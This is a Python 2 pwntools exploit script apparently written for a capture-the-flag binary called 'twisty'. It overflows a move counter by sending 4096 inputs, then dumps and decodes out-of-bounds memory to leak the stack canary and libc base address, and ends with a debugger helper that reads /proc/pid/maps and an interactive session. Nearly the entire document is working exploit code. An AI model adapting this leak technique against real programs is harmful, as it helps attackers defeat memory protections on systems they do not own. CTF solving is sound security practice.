"""
board : [rsp+18h] [rbp-860h] 

"""


from pwn import * 
from time import sleep 

def get_PIE(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    return int(memory_map[0].split("-")[0],16)

def debug(bp):
    #bp = [0xea0,0xd31,0xc52]
    #bp = [0x00000dfb,0x00000b7c,0x00000d10]
    script = ""
    PIE = get_PIE(sh)
    PAPA = PIE
    print(hex(PIE))
    for x in bp:
        script += "b *0x%x\n"%(PIE+x)
    gdb.attach(sh,gdbscript=script) 

value = {
    'c0u' : 0,
    'c1u' : 1,
    'c2u' : 2,
    'c3u' : 3, 
    'c0d' : 4,
    'c1d' : 5, 
    'c2d' : 6,
    'c3d' : 7,
    'r0r' : 8,
    'r1r' : 9,
    'r2r' : 10,
    'r3r' : 11,
    'r0l' : 12,
    'r1l' : 13,
    'r2l' : 14,
    'r3l' : 15
}
decode_value = {v: k for k, v in value.iteritems()} 

def decode_word(m) : 
    w = 0 
    for i in range(0, 16, 2) : 
        w += value[m[i+1]] * (16 ** i) + value[m[i]] * (16 ** (i+1)) 
    return w 
    
context.terminal = ['tmux', 'splitw', '-h']
# with context.verbose:
sh = process("./twisty")
for i in range(4096) : 
    sh.recvuntil("> ") 
    sh.sendline("c1d") 

sleep(0.1)
sh.recvuntil("> ") 
sh.sendline(decode_value[0xf]) 

sh.recvuntil("> ") 
sh.sendline("l") 
sleep(0.1)
m = sh.recvline()[:-1].split(" ") 

log.success("COUNT = " + hex(decode_word(m[0x1000 : 0x1000 + 16])))
log.success("CANARY = " + hex(decode_word(m[0x1020 : 0x1020+16])))
log.success("LIBC = " + hex(decode_word(m[0x10a0 : 0x10a0+16]) - 0x20830))

# debug([0x950])
sh.interactive()
